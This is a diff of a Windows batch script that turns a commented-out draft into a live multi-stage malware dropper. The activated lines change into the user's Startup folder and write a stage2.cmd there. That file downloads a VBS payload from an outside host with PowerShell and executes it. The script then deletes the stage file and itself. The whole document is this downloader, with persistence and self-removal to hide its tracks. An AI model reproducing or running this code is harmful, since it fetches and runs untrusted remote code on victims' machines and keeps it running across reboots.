@@ -1,20 +1,25 @@
+@echo off
 
-@REM @echo off
+SET currentDirectory=%cd%
 
-@REM SET currentDirectory=%cd%
-@REM echo Current directory: %currentDirectory%
-
-@REM SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-@REM cd %STARTUPPATH%
-
-@REM build stage 2
-@REM (
-@REM     powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/next.config.ts' -OutFile 'C:\malware\test\download.txt'"
-@REM ) > stage2.cmd
+SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cd %STARTUPPATH%
 
 
+@REM Wirtes the powershell script to download and run the payloads to a .cmd file called "stage2.cmd"
+(
+    @REM download the payload
+    echo powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/Basic_typr.vbs' -OutFile payload.vbs"
+    echo powershell Start-Sleep -Seconds 1
+    echo powershell ./payload.vbs
+    @REM run stage2
+    @REM powershell -ExecutionPolicy Bypass -Command "& 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'"
+) > stage2.cmd
 
-@REM cd %currentDirectory%
+powershell ./stage2.cmd
+del stage2.cmd
 
 @rem uncomment to make the script delete itself
-@rem del initial.bat
+cd %currentDirectory%
+del initial.cmd
+
